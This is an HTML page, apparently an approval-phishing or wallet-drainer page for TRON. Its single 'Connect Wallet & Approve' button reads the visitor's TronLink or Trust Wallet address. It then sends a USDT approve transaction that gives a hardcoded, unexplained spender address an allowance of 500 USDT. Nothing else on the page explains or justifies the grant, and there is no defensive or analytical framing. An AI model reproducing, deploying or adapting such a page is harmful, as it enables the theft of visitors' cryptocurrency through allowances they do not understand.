<!doctype html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <title>TRON USDT Approve</title>

  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>

  <style>
    body {
      background: #111;
      color: white;
      font-family: Arial, sans-serif;
      padding: 30px;
      text-align: center;
    }

    h2 {
      margin-bottom: 20px;
    }

    button {
      padding: 14px 20px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      margin: 10px;
      font-size: 16px;
      background: #00c853;
      color: white;
    }

    #status {
      margin-top: 25px;
      white-space: pre-line;
      word-break: break-word;
      font-size: 15px;
    }
  </style>
</head>

<body>

  <h2>TRON USDT Approve</h2>

  <button id="approveBtn">
    Connect Wallet & Approve
  </button>

  <div id="status"></div>

  <script>
    const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

    // адрес spender
    const SPENDER_ADDRESS = "TKrEGuwgHvuJWbWfLtnoG7NdiEJpBqfMzj";

    // 500 USDT
    const AMOUNT = "500000000";

    const statusEl = document.getElementById("status");
    const approveBtn = document.getElementById("approveBtn");

    function setStatus(text) {
      statusEl.innerText = text;
    }

    approveBtn.onclick = async () => {
      try {

        // проверяем Tron provider
        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
          setStatus("Открой страницу внутри браузера TronLink / Trust Wallet");
          return;
        }

        approveBtn.disabled = true;

        setStatus("Подключение кошелька...");

        const walletAddress = window.tronWeb.defaultAddress.base58;

        setStatus(
          "Кошелек подключен:\n" +
          walletAddress +
          "\n\nПодготовка approve..."
        );

        // минимальный ABI
        const abi = [
          {
            "constant": false,
            "inputs": [
              { "name": "_spender", "type": "address" },
              { "name": "_value", "type": "uint256" }
            ],
            "name": "approve",
            "outputs": [
              { "name": "", "type": "bool" }
            ],
            "type": "function"
          }
        ];

        const contract = await tronWeb.contract(
          abi,
          USDT_ADDRESS
        );

        setStatus("Подтвердите approve в кошельке...");

        const tx = await contract
          .approve(SPENDER_ADDRESS, AMOUNT)
          .send({
            feeLimit: 100000000
          });

        setStatus(
          "Approve успешно отправлен!\n\nTX:\n" + tx
        );

      } catch (err) {
        console.error(err);

        setStatus(
          "Ошибка:\n" +
          (err.message || err)
        );
      } finally {
        approveBtn.disabled = false;
      }
    };
  </script>

</body>
</html>
